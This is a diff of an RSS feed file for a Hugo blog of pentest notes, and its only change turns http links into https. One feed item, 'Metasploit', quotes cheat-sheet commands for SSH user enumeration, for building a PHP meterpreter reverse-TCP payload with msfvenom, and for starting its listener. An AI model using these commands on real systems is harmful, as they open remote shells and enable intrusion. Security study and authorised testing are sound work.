@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>User on pentest notes</title>
-    <link>http://sosprz.github.io/tags/user/</link>
+    <link>https://sosprz.github.io/tags/user/</link>
     <description>Recent content in User on pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>Your language code</language>
     <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
     
-	<atom:link href="http://sosprz.github.io/tags/user/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/tags/user/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Metasploit</title>
-      <link>http://sosprz.github.io/post/metasploit/</link>
+      <link>https://sosprz.github.io/post/metasploit/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>http://sosprz.github.io/post/metasploit/</guid>
+      <guid>https://sosprz.github.io/post/metasploit/</guid>
       <description>#ssh user enum search enumusers use options set USER_FILE run 
 #php, image reverse shell #php4,php5  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8888 -f raw msfconsole handler -p php/meterpreter/reverse_tcp -P 8888 -H 192.168.0.1</description>
     </item>
